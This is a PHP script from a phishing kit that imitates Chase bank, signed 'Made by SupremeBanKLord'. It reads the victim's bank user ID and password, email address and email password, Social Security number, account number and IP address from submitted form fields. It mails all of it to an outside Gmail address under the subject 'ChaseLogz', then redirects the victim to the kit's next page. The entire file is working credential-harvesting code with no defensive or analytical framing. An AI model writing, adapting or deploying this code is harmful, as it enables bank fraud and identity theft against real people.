<?

$ip = getenv("REMOTE_ADDR");
$message .= "-------CHase Spam ReZult----------\n";
$message .= "User ID: ".$_POST['UserID']."\n";
$message .= "Password: ".$_POST['Password']."\n";
$message .= "E-mail Address: ".$_POST['email']."\n";
$message .= "E-mail Password: ".$_POST['epass']."\n";
$message .= "------SSN & Account Number------\n";
$message .= "Social Security Number: ".$_POST['txtSSN1']." ".$_POST['txtSSN2']." ".$_POST['txtSSN3']."\n";
$message .= "Account Number: ".$_POST['accountno']."\n";
$message .= "---------IP and Date--------\n";
$message .= "IP Address: ".$ip."\n";
$message .= "Date: ".$adddate."\n";
$message .= "-----Made by SupremeBanKLord-------------\n";
$recipient = "dieonyourmatter@gmail.com";
$subject = "ChaseLogz $ip";
$headers = "From: ";
$headers .= $_POST['UserID']."\n";
if (mail($recipient,$subject,$message,$headers))
   {
   header("Location:access3.php");

   }


?>